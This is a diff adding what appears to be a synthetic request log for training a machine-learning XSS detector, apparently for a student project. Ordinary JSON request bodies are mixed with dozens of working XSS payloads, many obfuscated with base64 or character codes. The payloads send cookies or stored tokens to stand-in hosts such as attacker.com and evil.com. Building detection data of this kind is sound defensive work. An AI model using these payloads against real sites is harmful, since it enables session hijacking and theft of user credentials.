@@ -1,0 +1,187 @@
+﻿2026-06-03T17:35:10.111-03:00 INFO IP: 192.168.1.100 BODY: {"perfil_publico":"<base href='https://attacker.com/'> <img src='/steal?cookie='>"}
+2026-06-03T17:36:05.222-03:00 INFO IP: 10.0.0.15 BODY: {"meta_data":"<link rel='stylesheet' href='javascript:document.location=\"https://log.attacker.com/?d=\"+document.cookie'>"}
+2026-06-03T17:37:40.333-03:00 INFO IP: 177.55.20.9 BODY: {"config_tema":"{\"background\":\"url('javascript:window.top.location=\"https://phish.io/\"')\"}"}
+2026-06-03T17:38:15.444-03:00 INFO IP: 189.10.20.30 BODY: {"bio":"<object data='data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMDt1cmw9aHR0cHM6Ly9ldmlsLmlvLyI+'>"}
+2026-06-03T17:39:50.555-03:00 INFO IP: 201.0.1.5 BODY: {"relatorio_extra":"<form><button formaction='javascript:fetch(\"https://c.io/\"+document.domain)'>Clique para Salvar</button></form>"}
+2026-06-03T17:40:22.666-03:00 INFO IP: 192.168.0.5 BODY: {"search_advanced":"<svg><use xlink:href='data:image/svg+xml,<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"><script>fetch(\"https://attacker.com/\"+btoa(document.cookie))<\/script></svg>#x'></use>"}2026-05-11T16:02:32.333-03:00 INFO IP: 192.168.0.5 BODY: {"nome":"<link/rel='import'/href='//attacker.site/x.html'>"}
+2026-05-11T16:02:02.333-03:00 INFO IP: 10.0.0.15 BODY: {"status":"running","pid":1234,"cpu_usage":12.5}
+2026-05-11T16:02:48.999-03:00 INFO IP: 177.0.0.1 BODY: {"server_log":"Memory cleanup at 16:02:00."}
+2026-05-11T16:02:23.444-03:00 INFO IP: 177.88.99.1 BODY: {"nome":"<input/onfocus=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))/autofocus>"}
+2026-05-11T16:01:00.111-03:00 INFO IP: 192.168.1.50 BODY: {"help_ticket":{"subject":"Erro no pagamento","priority":"high"}}
+2026-05-11T16:00:28.666-03:00 INFO IP: 189.1.1.1 BODY: {"nome":"<object data='javascript:fetch(\"http://evil.com\")'></object>"}
+2026-05-11T16:01:05.666-03:00 INFO IP: 189.99.88.77 BODY: {"xss":"<textarea/onfocus=eval(atob('ZmV0Y2goIi8vYXR0YWNrZXIuY29tLyIrZG9CdW1lbnQuY29va2llKQ=='))>"}
+2026-05-11T16:02:24.555-03:00 INFO IP: 192.168.1.1 BODY: {"quote":"Segurança não é um produto, mas um processo."}
+2026-05-11T16:02:27.888-03:00 INFO IP: 189.33.22.11 BODY: {"payload":"<marquee/onmouseover=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk='))>"}
+2026-05-11T16:01:26.777-03:00 INFO IP: 172.16.0.1 BODY: {"search_query":"como tratar nulos em dataframes pandas"}
+2026-05-11T16:01:55.666-03:00 INFO IP: 177.55.44.33 BODY: {"note":"Lembrar de incluir as métricas de Precision e Recall no relatório."}
+2026-05-11T16:02:05.666-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<frameset/onload=fetch('//evil.com')>"}
+2026-05-11T16:02:20.111-03:00 INFO IP: 172.16.1.1 BODY: {"memo":"Não esquecer da apresentação na próxima sexta-feira."}
+2026-05-11T16:02:46.777-03:00 INFO IP: 10.0.0.15 BODY: {"active_users":45}
+2026-05-11T16:02:01.222-03:00 INFO IP: 189.2.2.2 BODY: {"nome":"<isindex/formaction='javascript:fetch(\"//evil.com\")'>"}
+2026-05-11T16:01:42.333-03:00 INFO IP: 172.16.0.40 BODY: {"user_profile":{"username":"sacchi_gabriel","points":1500}}
+2026-05-11T16:00:05.111-03:00 INFO IP: 192.168.1.15 BODY: {"config":{"theme":"dark","lang":"pt-BR","fontSize":14}}
+2026-05-11T16:00:39.888-03:00 INFO IP: 192.168.0.1 BODY: {"admin_msg":"Favor revisar os logs de acesso da rede interna."}
+2026-05-11T16:00:17.444-03:00 INFO IP: 172.16.0.40 BODY: {"auth":{"type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}}
+2026-05-11T16:00:12.888-03:00 INFO IP: 189.10.20.30 BODY: {"xss":"<audio src/onerror='new(Image).src=\"http://evil.com/\"+document.cookie'>"}
+2026-05-11T16:02:11.222-03:00 INFO IP: 172.16.0.1 BODY: {"task":"Review TCC Section 4 - Methodology"}
+2026-05-11T16:01:23.444-03:00 INFO IP: 189.5.5.5 BODY: {"nome":"<svg/onload=fetch('//evil.com/'+document.cookie)>"}
+2026-05-11T16:00:43.333-03:00 INFO IP: 172.16.0.1 BODY: {"nome":"Amanda Oliveira","email":"amanda88@provedor.com.br"}
+2026-05-11T16:02:45.666-03:00 INFO IP: 189.2.2.2 BODY: {"nome":"<isindex/formaction='javascript:eval(atob(\"ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk=\"))'>"}
+2026-05-11T16:02:06.777-03:00 INFO IP: 192.168.0.1 BODY: {"log":"Database migration completed at 16:00:00."}
+2026-05-11T16:02:22.333-03:00 INFO IP: 10.0.0.1 BODY: {"last_login":"2026-05-11 15:55:00"}
+2026-05-11T16:01:30.111-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<svg><desc><![CDATA[<script>fetch('//evil.com')</script>]]></desc></svg>"}
+2026-05-11T16:02:21.222-03:00 INFO IP: 189.10.20.30 BODY: {"xss":"<audio/src/onerror=eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,105,111,39,41))>"}
+2026-05-11T16:00:58.999-03:00 INFO IP: 189.33.22.11 BODY: {"payload":"<svg/onmouseover='(new(Image)).src=\"//attacker.com/\"+localStorage.token'>"}
+2026-05-11T16:02:55.666-03:00 INFO IP: 172.16.0.1 BODY: {"search_history":["machine learning","cybersecurity","python"]}
+2026-05-11T16:02:50.111-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<frameset/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))>"}
+2026-05-11T16:02:58.999-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<svg/onmouseover=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk='))>"}
+2026-05-11T16:01:20.111-03:00 INFO IP: 177.0.0.1 BODY: {"login_attempt":{"success":false,"reason":"wrong-password"}}
+2026-05-11T16:01:03.444-03:00 INFO IP: 192.168.0.5 BODY: {"nome":"<audio/src/onplaying='fetch(\"//evil.com/\"+document.cookie)'>"}
+2026-05-11T16:02:08.999-03:00 INFO IP: 192.168.1.10 BODY: {"user_type":"premium","expiration":"2027-01-01"}
+2026-05-11T16:03:08.999-03:00 INFO IP: 192.168.1.1 BODY: {"success":true}
+2026-05-11T16:03:02.333-03:00 INFO IP: 192.168.0.100 BODY: {"id":123,"value":"test-data"}
+2026-05-11T16:01:40.111-03:00 INFO IP: 192.168.1.1 BODY: {"feedback":"O sistema de detecção de ameaças parece muito promissor."}
+2026-05-11T16:02:14.555-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<script>eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,99,111,109,39,41))</script>"}
+2026-05-11T16:03:10.111-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<video><source/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5uZXQnKQ=='))></video>"}
+2026-05-11T16:01:18.999-03:00 INFO IP: 192.168.1.25 BODY: {"nome":"<details/open/ontoggle=window.location.assign('//attacker.com')>"}
+2026-05-11T16:01:54.555-03:00 INFO IP: 189.1.1.1 BODY: {"nome":"<object/data='javascript:fetch(\"//evil.com\")'></object>"}
+2026-05-11T16:02:12.333-03:00 INFO IP: 189.55.1.4 BODY: {"comment":"<svg/onmouseover=fetch('//attacker.com')>"}
+2026-05-11T16:02:17.888-03:00 INFO IP: 192.168.0.100 BODY: {"alert_status":"none","monitoring":true}
+2026-05-11T16:02:56.777-03:00 INFO IP: 189.55.1.4 BODY: {"comment":"<img/src=1/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20nKQ=='))>"}
+2026-05-11T16:01:32.333-03:00 INFO IP: 187.1.55.99 BODY: {"nome":"<details/open/ontoggle=navigator.sendBeacon('//evil.io')>"}
+2026-05-11T16:02:13.444-03:00 INFO IP: 192.168.1.15 BODY: {"backup_status":"completed","destination":"Cloud-Storage-1"}
+2026-05-11T16:00:14.111-03:00 INFO IP: 177.88.99.1 BODY: {"nome":"<input onfocus=window.location='http://attacker.com/' autofocus>"}
+2026-05-11T16:01:50.111-03:00 INFO IP: 189.99.88.77 BODY: {"xss":"<a/href='javascript:fetch(\"//attacker.com\")'>View Report</a>"}
+2026-05-11T16:00:32.111-03:00 INFO IP: 10.0.0.3 BODY: {"comment":"<form id='x' /><button form='x' formaction='javascript:fetch(\"//attacker.com\")'>Post</button>"}
+2026-05-11T16:00:47.777-03:00 INFO IP: 177.44.22.10 BODY: {"search":"como configurar vscode para python 3.11"}
+2026-05-11T16:01:44.555-03:00 INFO IP: 192.168.1.50 BODY: {"event":"graduation_party","date":"2026-12-15"}
+2026-05-11T16:02:28.999-03:00 INFO IP: 192.168.1.50 BODY: {"reminder":"Submeter o artigo para a conferência até amanhã."}
+2026-05-11T16:00:31.999-03:00 INFO IP: 192.168.1.100 BODY: {"tags":["cybersecurity","deep-learning","xss-detection"]}
+2026-05-11T16:00:37.666-03:00 INFO IP: 177.0.0.1 BODY: {"cart_summary":{"total":159.90,"items_count":2}}
+2026-05-11T16:00:51.222-03:00 INFO IP: 172.16.1.1 BODY: {"comment":"Adorei o artigo sobre Redes Neurais Convolucionais!"}
+2026-05-11T16:01:04.555-03:00 INFO IP: 10.0.0.2 BODY: {"notification":"Você tem 3 novas mensagens não lidas."}
+2026-05-11T16:00:04.988-03:00 INFO IP: 189.55.1.4 BODY: {"comment":"<svg/onload='document.location=\"http://attacker.com/steal?token=\"+localStorage.getItem(\"token\")'>"}
+2026-05-11T16:00:48.888-03:00 INFO IP: 187.1.55.99 BODY: {"nome":"<math><mtext><option><fake><script>fetch(\"//evil.com\")</script>"}
+2026-05-11T16:03:00.111-03:00 INFO IP: 177.44.22.10 BODY: {"role":"student","institution":"IFSP"}
+2026-05-11T16:00:25.333-03:00 INFO IP: 172.16.5.5 BODY: {"data":{"temp":24.5,"hum":60,"loc":"Laboratório 4"}}
+2026-05-11T16:00:03.455-03:00 INFO IP: 172.16.0.1 BODY: {"search":"como integrar scikit-learn com tensorflow","page":2,"tags":["python","ml"]}
+2026-05-11T16:02:40.111-03:00 INFO IP: 177.55.44.33 BODY: {"goal":"Alcançar 99% de acurácia no dataset de validação."}
+2026-05-11T16:00:10.666-03:00 INFO IP: 10.0.0.12 BODY: {"msg":"<body/onpageshow=fetch('http://phish.me/'+document.cookie)>"}
+2026-05-11T16:01:31.222-03:00 INFO IP: 177.44.22.10 BODY: {"nome":"Carlos Eduardo Mendes","role":"Professor Coorientador"}
+2026-05-11T16:00:36.555-03:00 INFO IP: 192.168.1.25 BODY: {"nome":"<keygen onfocus='window.location=\"http://attacker.com/\"'>"}
+2026-05-11T16:00:38.777-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<frameset onload='(new Image()).src=\"http://attacker.com/log?\"+document.cookie'>"}
+2026-05-11T16:01:37.888-03:00 INFO IP: 10.0.0.1 BODY: {"auth_status":"authenticated","user_id":456789}
+2026-05-11T16:01:14.555-03:00 INFO IP: 10.0.0.3 BODY: {"comment":"<form/action='javascript:fetch(\"//evil.com\")'><input/type='submit'>"}
+2026-05-11T16:01:47.888-03:00 INFO IP: 192.168.0.5 BODY: {"nome":"<link/rel='import'/href='//evil.com/x.html'>"}
+2026-05-11T16:00:56.777-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<iframe/src=\"javascript:fetch('//evil.com/'+document.cookie)\">"}
+2026-05-11T16:00:57.888-03:00 INFO IP: 172.16.0.40 BODY: {"order_id":987654,"items":["Mouse","Pad","Webcam"]}
+2026-05-11T16:01:21.222-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<frameset/onload=eval(atob('ZmV0Y2goIi8vYXR0YWNrZXIuY29tLyIrZG9jdW1lbnQuY29va2llKQ=='))>"}
+2026-05-11T16:02:41.222-03:00 INFO IP: 10.0.0.20 BODY: {"nome":"<embed/src='javascript:eval(atob(\"ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk=\"))'></embed>"}
+2026-05-11T16:01:45.666-03:00 INFO IP: 10.0.0.10 BODY: {"nome":"<table/background='javascript:fetch(\"//evil.com\")'>"}
+2026-05-11T16:02:47.888-03:00 INFO IP: 192.168.1.25 BODY: {"nome":"<keygen/onfocus=eval(atob('ZmV0Y2goJy8vZXZpbC5pbycp'))>"}
+2026-05-11T16:00:40.999-03:00 INFO IP: 189.5.5.5 BODY: {"nome":"<svg><animatetransform onbegin=fetch('http://evil.com/'+document.cookie)>"}
+2026-05-11T16:02:51.222-03:00 INFO IP: 192.168.0.1 BODY: {"msg":"O modelo está respondendo bem a ataques ofuscados."}
+2026-05-11T16:00:08.444-03:00 INFO IP: 187.1.55.99 BODY: {"nome":"<details open ontoggle=eval(atob('ZmV0Y2goImh0dHA6Ly9hdHRhY2tlci5jb20vIitkb2N1bWVudC5jb29raWUp'))>"}
+2026-05-11T16:01:35.666-03:00 INFO IP: 172.16.1.1 BODY: {"message":"A reunião foi remarcada para as 14h na sala 302."}
+2026-05-11T16:03:01.222-03:00 INFO IP: 187.1.55.99 BODY: {"nome":"<details/open/ontoggle=eval(atob('ZmV0Y2goJy8vZXZpbC5pbycp'))>"}
+2026-05-11T16:02:35.666-03:00 INFO IP: 172.16.5.5 BODY: {"machine_stats":{"temp":45,"fan_speed":2500}}
+2026-05-11T16:00:35.444-03:00 INFO IP: 10.0.0.15 BODY: {"system_info":{"os":"Windows 11","arch":"x64","version":"22H2"}}
+2026-05-11T16:01:07.888-03:00 INFO IP: 10.0.0.8 BODY: {"css":"<link/rel='stylesheet'/href='javascript:fetch(\"//evil.com\")'>"}
+2026-05-11T16:01:28.999-03:00 INFO IP: 192.168.1.15 BODY: {"app_settings":{"notifications":{"email":true,"push":false}}}
+2026-05-11T16:01:33.444-03:00 INFO IP: 192.168.0.100 BODY: {"stats":{"clicks":150,"conversions":12}}
+2026-05-11T16:00:49.999-03:00 INFO IP: 192.168.0.100 BODY: {"sensor_data":{"co2":400,"temp":22.1,"humidity":45}}
+2026-05-11T16:01:57.888-03:00 INFO IP: 192.168.1.100 BODY: {"action":"logout","user_id":998877}
+2026-05-11T16:01:53.444-03:00 INFO IP: 192.168.1.5 BODY: {"search_results":[{"id":1,"title":"Python XSS Detection"},{"id":2,"title":"ML in Cybersecurity"}]}
+2026-05-11T16:00:02.122-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<img src=x onerror='fetch(\"http://evil.io/\"+btoa(document.cookie))'>"}
+2026-05-11T16:01:43.444-03:00 INFO IP: 189.33.22.11 BODY: {"payload":"<marquee/onmouseover=fetch('//attacker.com')>"}
+2026-05-11T16:00:11.777-03:00 INFO IP: 172.16.1.1 BODY: {"file_path":"C:\\Users\\Public\\Documents\\relatorio_v3.pdf","size_kb":2048}
+2026-05-11T16:00:50.111-03:00 INFO IP: 10.0.0.12 BODY: {"payload":"<base href='javascript:fetch(\"//evil.com\")//'>"}
+2026-05-11T16:02:25.666-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<video><source/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20nKQ=='))></video>"}
+2026-05-11T16:00:29.777-03:00 INFO IP: 177.55.44.33 BODY: {"text":"Muito bom o projeto final de curso, excelente abordagem de ML."}
+2026-05-11T16:03:04.555-03:00 INFO IP: 172.16.1.1 BODY: {"final_note":"O projeto está concluído."}
+2026-05-11T16:01:16.777-03:00 INFO IP: 189.2.2.2 BODY: {"nome":"<img/src=1/onmouseover=eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,99,111,109,39,41))>"}
+2026-05-11T16:01:13.444-03:00 INFO IP: 192.168.1.100 BODY: {"user_activity":[{"action":"click","id":"btn-save"},{"action":"type","id":"input-name"}]}
+2026-05-11T16:02:42.333-03:00 INFO IP: 192.168.1.100 BODY: {"user_pref":{"language":"en","region":"US"}}
+2026-05-11T16:00:54.555-03:00 INFO IP: 177.88.99.1 BODY: {"nome":"<form><button formaction='javascript:fetch(\"//evil.com\")'>Click</button></form>"}
+2026-05-11T16:01:06.777-03:00 INFO IP: 172.16.5.5 BODY: {"project":"Final Graduation Project - Cybersecurity"}
+2026-05-11T16:01:17.888-03:00 INFO IP: 10.0.0.15 BODY: {"inventory":{"status":"in-stock","warehouse":"Sector-B"}}
+2026-05-11T16:01:10.111-03:00 INFO IP: 189.1.1.1 BODY: {"nome":"<table/background='javascript:navigator.sendBeacon(\"//evil.io\")'>"}
+2026-05-11T16:03:03.444-03:00 INFO IP: 10.0.0.12 BODY: {"msg":"<body/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk='))>"}
+2026-05-11T16:02:38.999-03:00 INFO IP: 189.1.1.1 BODY: {"nome":"<object/data='javascript:eval(atob(\"ZmV0Y2goJy8vZXZpbC5jb20nKQ==\"))'></object>"}
+2026-05-11T16:00:24.222-03:00 INFO IP: 189.99.88.77 BODY: {"xss":"<a href='javascript:void(fetch(\"http://attacker.com/\"+document.cookie))'>Click</a>"}
+2026-05-11T16:00:06.222-03:00 INFO IP: 10.0.0.8 BODY: {"payload":"<script>navigator.sendBeacon(\"http://malware.org/log\",document.cookie)</script>"}
+2026-05-11T16:01:24.555-03:00 INFO IP: 192.168.1.10 BODY: {"doc_id":"TCC_IFSP_FINAL_V2.docx","status":"uploaded"}
+2026-05-11T16:01:36.777-03:00 INFO IP: 189.10.20.30 BODY: {"xss":"<audio/src/onerror=eval(atob('ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbS8iKQ=='))>"}
+2026-05-11T16:01:08.999-03:00 INFO IP: 192.168.1.5 BODY: {"settings":{"notifications":true,"privacy":"friends-only"}}
+2026-05-11T16:02:37.888-03:00 INFO IP: 192.168.1.5 BODY: {"results_count":10,"query_time_ms":12}
+2026-05-11T16:02:34.555-03:00 INFO IP: 189.99.88.77 BODY: {"xss":"<a/href='javascript:navigator.sendBeacon(\"//evil.com\")'>Click Me</a>"}
+2026-05-11T16:00:33.222-03:00 INFO IP: 172.16.0.2 BODY: {"search":"livros de George Orwell 1984","available":true}
+2026-05-11T16:02:36.777-03:00 INFO IP: 10.0.0.8 BODY: {"css":"<style>@import'//attacker.com/malicious.css';</style>"}
+2026-05-11T16:00:27.555-03:00 INFO IP: 192.168.1.5 BODY: {"query":"SELECT name FROM users WHERE id = 10"}
+2026-05-11T16:00:09.555-03:00 INFO IP: 192.168.0.100 BODY: {"status":"OK","uptime":"15 days","load":[0.1, 0.5, 0.2]}
+2026-05-11T16:02:15.666-03:00 INFO IP: 177.44.22.10 BODY: {"coauthor":"Rafael Souza","department":"Computing"}
+2026-05-11T16:02:52.333-03:00 INFO IP: 189.5.5.5 BODY: {"nome":"<svg/onload=fetch('//malicious.site')>"}
+2026-05-11T16:01:11.222-03:00 INFO IP: 177.55.44.33 BODY: {"text":"A inteligência artificial está mudando a forma como protegemos sistemas."}
+2026-05-11T16:00:20.777-03:00 INFO IP: 10.0.0.10 BODY: {"nome":"<table background='javascript:fetch(\"http://evil.com\")'></table>"}
+2026-05-11T15:00:07.333-03:00 INFO IP: 177.44.22.10 BODY: {"nome":"João Conceição de Araújo","bio":"Estudante de Engenharia no IFSP campus São Paulo."}
+2026-05-11T16:01:48.999-03:00 INFO IP: 10.0.0.2 BODY: {"system":"Ubuntu 22.04 LTS","kernel":"5.15.0-generic"}
+2026-05-11T16:01:38.999-03:00 INFO IP: 177.88.99.1 BODY: {"nome":"<input/onfocus=fetch('//attacker.com')/autofocus>"}
+2026-05-11T16:01:12.333-03:00 INFO IP: 10.0.0.20 BODY: {"nome":"<body/onresize=fetch('//evil.com/'+document.cookie)>"}
+2026-05-11T16:01:02.333-03:00 INFO IP: 177.11.22.33 BODY: {"weather":{"city":"São Paulo","temp":18,"condition":"Nublado"}}
+2026-05-11T16:02:18.999-03:00 INFO IP: 10.0.0.12 BODY: {"msg":"<body/onpageshow=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))>"}
+2026-05-11T16:00:45.555-03:00 INFO IP: 192.168.1.15 BODY: {"log":"Memory usage: 450MB / 8000MB"}
+2026-05-11T16:01:27.888-03:00 INFO IP: 189.55.1.4 BODY: {"comment":"<img/src=x/onerror=document.location.replace('//attacker.com')>"}
+2026-05-11T16:02:07.888-03:00 INFO IP: 189.5.5.5 BODY: {"nome":"<svg/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tL3gnKQ=='))>"}
+2026-05-11T16:02:43.444-03:00 INFO IP: 10.0.0.3 BODY: {"comment":"<form/action='javascript:eval(atob(\"ZmV0Y2goJy8vZXZpbC5pbycp\"))'><input/type='submit'>"}
+2026-05-11T16:00:16.333-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<video><source onerror=\"eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,39,41))\"></video>"}
+2026-05-11T16:02:30.111-03:00 INFO IP: 10.0.0.10 BODY: {"nome":"<table/background='javascript:fetch(\"//malicious.com\")'>"}
+2026-05-11T16:00:30.888-03:00 INFO IP: 10.0.0.20 BODY: {"nome":"<embed src='javascript:console.log(document.cookie)'></embed>"}
+2026-05-11T16:00:26.444-03:00 INFO IP: 10.0.0.8 BODY: {"css":"<style>@import 'http://evil.com/xss.css';</style>"}
+2026-05-11T16:03:05.666-03:00 INFO IP: 189.10.20.30 BODY: {"xss":"<audio/src/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20nKQ=='))>"}
+2026-05-11T16:00:01.001-03:00 INFO IP: 192.168.1.10 BODY: {"user":"gabriel_ifsp","action":"login","timestamp":1715454001}
+2026-05-11T16:00:15.222-03:00 INFO IP: 192.168.1.1 BODY: {"feedback":"Achei o campo de busca meio confuso, mas os resultados são bons."}
+2026-05-11T16:00:44.444-03:00 INFO IP: 189.55.1.4 BODY: {"msg":"<details/ontoggle='(new(Image)).src=\"//evil.com/\"+document.cookie'>"}
+2026-05-11T16:01:41.222-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<video><source/onerror=fetch('//evil.com')></video>"}
+2026-05-11T16:02:00.111-03:00 INFO IP: 172.16.0.2 BODY: {"weather_update":{"city":"Campinas","temp":25}}
+2026-05-11T16:02:31.222-03:00 INFO IP: 177.11.22.33 BODY: {"thought":"A detecção baseada em rede neural é muito mais eficaz que RegEx."}
+2026-05-11T16:01:22.333-03:00 INFO IP: 192.168.0.1 BODY: {"system_update":"Versão 2.4.1 instalada com sucesso."}
+2026-05-11T16:01:56.777-03:00 INFO IP: 10.0.0.20 BODY: {"nome":"<embed/src='javascript:fetch(\"//evil.com\")'></embed>"}
+2026-05-11T16:00:13.999-03:00 INFO IP: 10.0.0.1 BODY: {"request":{"id":"f47ac10b-58cc-4372-a567-0e02b2c3d479","method":"POST"}}
+2026-05-11T16:01:46.777-03:00 INFO IP: 177.11.22.33 BODY: {"comment":"O dataset sintético ajudou muito no treinamento do modelo."}
+2026-05-11T16:00:55.666-03:00 INFO IP: 192.168.1.1 BODY: {"profile_update":{"bio":"Entusiasta de tecnologia e segurança da informação."}}
+2026-05-11T16:01:34.555-03:00 INFO IP: 10.0.0.12 BODY: {"msg":"<body/onload=fetch('//phish.me/'+document.cookie)>"}
+2026-05-11T16:02:44.555-03:00 INFO IP: 172.16.0.2 BODY: {"weather_condition":"Clear Sky","wind_speed":10}
+2026-05-11T16:00:19.666-03:00 INFO IP: 192.168.1.50 BODY: {"item":{"id":99,"name":"Teclado Mecânico","price":250.00,"stock":true}}
+2026-05-11T16:03:07.888-03:00 INFO IP: 177.88.99.1 BODY: {"nome":"<input/onfocus=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuaW8nKQ=='))/autofocus>"}
+2026-05-11T16:00:42.222-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<script/src='//attacker.com/x.js'></script>"}
+2026-05-11T16:02:33.444-03:00 INFO IP: 10.0.0.2 BODY: {"uptime_summary":{"days":30,"hours":12,"minutes":45}}
+2026-05-11T16:02:26.777-03:00 INFO IP: 172.16.0.40 BODY: {"points_balance":4500,"tier":"Gold"}
+2026-05-11T16:02:04.555-03:00 INFO IP: 177.0.0.1 BODY: {"session_id":"a1b2c3d4e5f6g7h8i9j0","active":true}
+2026-05-11T16:02:10.111-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<img/src=x/onerror=fetch('//evil.com/'+document.cookie)>"}
+2026-05-11T16:01:15.666-03:00 INFO IP: 172.16.0.2 BODY: {"product_review":{"rating":5,"text":"Excelente qualidade!"}}
+2026-05-11T16:01:01.222-03:00 INFO IP: 10.0.0.10 BODY: {"nome":"<marquee/onfinish=fetch('//evil.com/'+document.cookie)>"}
+2026-05-11T16:02:57.888-03:00 INFO IP: 192.168.1.15 BODY: {"system_health":"excellent"}
+2026-05-11T16:01:52.333-03:00 INFO IP: 10.0.0.8 BODY: {"css":"<style>@import'//evil.com/x.css';</style>"}
+2026-05-11T16:03:06.777-03:00 INFO IP: 10.0.0.1 BODY: {"session":"closed"}
+2026-05-11T16:01:58.999-03:00 INFO IP: 10.0.0.3 BODY: {"comment":"<form/id='f' /><button/form='f'/formaction='javascript:fetch(\"//evil.com\")'>Send</button>"}
+2026-05-11T16:02:53.444-03:00 INFO IP: 192.168.1.10 BODY: {"status":"final-check","ready":true}
+2026-05-11T16:00:52.333-03:00 INFO IP: 189.10.20.30 BODY: {"msg":"<button/onmouseover=navigator.sendBeacon('//evil.io',document.cookie)>"}
+2026-05-11T16:00:23.111-03:00 INFO IP: 10.0.0.2 BODY: {"log":"API Gateway: Request processed in 45ms"}
+2026-05-11T16:02:54.555-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<script>eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))</script>"}
+2026-05-11T16:00:53.444-03:00 INFO IP: 10.0.0.1 BODY: {"address":{"rua":"Sete de Setembro","numero":123,"cidade":"Indaiatuba"}}
+2026-05-11T16:00:34.333-03:00 INFO IP: 189.2.2.2 BODY: {"nome":"<isindex formaction='javascript:fetch(\"http://evil.com\")' type='submit'>"}
+2026-05-11T16:00:22.999-03:00 INFO IP: 192.168.0.5 BODY: {"nome":"<link rel='import' href='http://evil.com/xss.html'>"}
+2026-05-11T16:02:16.777-03:00 INFO IP: 187.1.55.99 BODY: {"nome":"<details/open/ontoggle=eval(atob('ZmV0Y2goJy8vZXZpbC5pbycp'))>"}
+2026-05-11T16:01:25.666-03:00 INFO IP: 10.0.0.5 BODY: {"nome":"<script>fetch('//malicious.site/log?c='+document.cookie)</script>"}
+2026-05-11T16:00:18.555-03:00 INFO IP: 189.33.22.11 BODY: {"payload":"<marquee onstart='fetch(\"http://attacker.com/\"+document.cookie)'>"}
+2026-05-11T16:01:51.222-03:00 INFO IP: 172.16.5.5 BODY: {"reading":{"voltage":220,"current":1.5,"power":330}}
+2026-05-11T16:00:21.888-03:00 INFO IP: 177.11.22.33 BODY: {"msg":"Olá, gostaria de saber o prazo de entrega para o CEP 01001-000."}
+2026-05-11T16:02:03.444-03:00 INFO IP: 192.168.1.25 BODY: {"nome":"<keygen/onfocus=fetch('//attacker.com')>"}
+2026-05-11T16:00:46.666-03:00 INFO IP: 10.0.0.8 BODY: {"xss":"<img src=x:one onerror=eval(atob('ZmV0Y2goImh0dHA6Ly9hdHRhY2tlci5jb20iK2RvY3VtZW50LmNvb2tpZSk='))>"}
+2026-05-11T16:00:41.111-03:00 INFO IP: 192.168.1.10 BODY: {"url":"https://ifsp.edu.br/tcc","status":"submitted"}
+2026-05-12T10:14:05.111-03:00 INFO IP: 198.51.100.45 BODY: {"busca":"%26%23x3c%3bscript%26%23x3e%3b%26%23x3c%3b%2fscript%26%23x3e Bhaskara"}
+2026-05-12T10:15:22.333-03:00 INFO IP: 203.0.113.12 BODY: {"comentario":"\u003cscript\u003e(document.domain)\u003c/script\u003e"}
+2026-05-12T10:16:40.888-03:00 INFO IP: 192.0.2.99 BODY: {"perfil":"<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>Clique Aqui</a>"}
+2026-05-12T10:17:11.512-03:00 INFO IP: 198.51.100.77 BODY: {"q":"produto &lt;img src=x onerror=confirm(1)&gt; desconto"}
+2026-05-12T10:18:03.009-03:00 INFO IP: 203.0.113.88 BODY: {"apelido":"<svg><animate onbegin=alert(1) attributeName=x dur=1s>"}
+2026-05-12T10:19:44.700-03:00 INFO IP: 192.0.2.150 BODY: {"redirect":"java%0ascript:alert(document.domain)"}
